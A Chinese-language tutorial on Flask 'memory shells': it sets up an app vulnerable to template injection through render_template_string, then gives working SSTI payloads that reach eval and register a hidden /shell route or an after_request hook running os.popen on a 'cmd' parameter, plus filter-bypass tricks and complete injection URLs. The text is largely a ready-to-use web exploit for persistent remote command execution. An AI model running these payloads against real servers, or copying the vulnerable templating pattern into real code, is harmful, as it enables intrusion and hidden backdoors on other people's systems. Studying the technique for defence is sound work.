FLASK 内存马，是基于模板注入的一种方法，该类方法通过我们的 eval 函数，来执行我们的 FLASK 当中存在的一些全局性的函数，来**构造创建一个新路由**，使得我们在执行者一个新路由的时候，能够**直接执行一个木马**。

## 构建环境
```python
from flask import Flask, request, render_template_string
app = Flask(__name__)
@app.route('/')
def hello_world():  # put application's code here
    person = 'knave'
    if request.args.get('name'):
        person = request.args.get('name')
    template = '<h1>Hi, %s.</h1>' % person
    return render_template_string(template)
if __name__ == '__main__':
    app.run()
```

## 分析：
首先，如果我们希望在我们的 flask 中注入我们的木马，也就是**构造一个危险的路由**，但是这样的路由一般来说是不存在的，于是我们就需要去手动构造我们的一个路由

首先，我们需要通过我们的模板注入中的方法，先获取我们的 `eval` 函数，
```python
url_for.__globals__['__builtins__']['eval']
```
然后，我们需要创建一个路由, 这里，我们不能采用我们的原来的那种 def 式方法，而要通过我们的 flask 中存在的一些特定的函数，来进行我们的声明，这里我们可以使用我们的 `app.add_url_rule` 来实现，**而这一类路由的查找，是通过观察我们的 python 源码来获得的**，具体来说，我们的语法如下所示：
```python
"app.add_url_rule(
		'/shell', 
		'shell', 
		lambda  :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()
		）
",
# _request_ctx_stack是Flask的一个全局变量, 是一个LocalStack实例, 这里的_request_ctx_stack即下文中提到的Flask 请求上下文管理机制中的_request_ctx_stack. app也是Flask的一个全局变量, 这里即获取当前的app.
```

```python
def add_url_rule(
        self,
        rule: str,
        endpoint: str | None = None,
        view_func: ft.RouteCallable | None = None,
        provide_automatic_options: bool | None = None,
        **options: t.Any,
    ) 

```

Rule：函数对应的 URL 规则，满足条件和 app.Route ()的第一个参数一样，必须以/开头；

Endpoint：这是 URL 规则的端点名。默认情况下，Flask 会使用视图函数的名字作为端点名。在路由到视图函数的过程中，Flask 会使用这个端点名。

View_func：这是一个函数，当请求匹配到对应的 URL 规则时，Flask 会调用这个函数，并将结果返回给客户端。


## BYPASS 绕过：
Url_for 可替换为 get_flashed_messages 或者 `request.__init__`或者 `request. Application`.

代码执行函数替换, 如 exec 等替换 eval.

字符串可采用拼接方式, 如`['__builtins__']['eval']`变为`['__bui'+'ltins__']['ev'+'al'].`

`__globals__`可用`__getattribute__('__globa'+'ls__')`替换.

`[]`可用`.__getitem__()`或`.Pop ()`替换.

过滤 `{{`或者`}}` , 可以使用{%或者%}绕过, `{%%}`中间可以执行 if 语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.

过滤`_`可以用编码绕过, 如`__class__`替换成`\x 5 f\x 5 fclass\x 5 f\x 5 f,` 还可以用` dir (0)[0][0]`或者 `request['args']`或者 `request['values']`绕过.

过滤了`. `可以采用 `attr ()`或`[]`绕过.

## 高版本方案：
再次尝试注入的时候报错了
![[Pasted image 20240918112955.png]]
这个错误是因为在Flask应用处理第一个请求之后，你试图改变路由设置。具体来说，你在应用已经开始运行并处理请求后，试图调用`add_url_rule`方法来添加一个新的路由。Flask禁止这样做，因为这可能会引发一些不一致的行为。

这个时候，我们就需要**找到一种方法**，首先能够构建路由，而且还可以**执行我们的方法**。
1. badrequest，这个方法允许我们在每个请求之前执行一些操作。我们可以利用这个方法来进行身份验证、请求参数的预处理等任务
```python
from flask import Flask, request
app = Flask(__name__)
@app.before_request
def before_request():
    if not request.headers.get("Authorization"):
        return "Unauthorized", 401

```


```
http://127.0.0.1:5000/%20CmdResp;CmdResp=__import__(/%27flask/%27).make_response(__import__(/%27os/%27).popen(request.args.get(/%27cmd/%27)).read())/%22)==None%20else%20resp)%22,%7B%27request%27:url_for.__globals__[%27request%27],%27app%27:url_for.__globals__[%27current_app%27]%7D)%7D%7D
```

```
http://127.0.0.1:5000/?name={{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}

```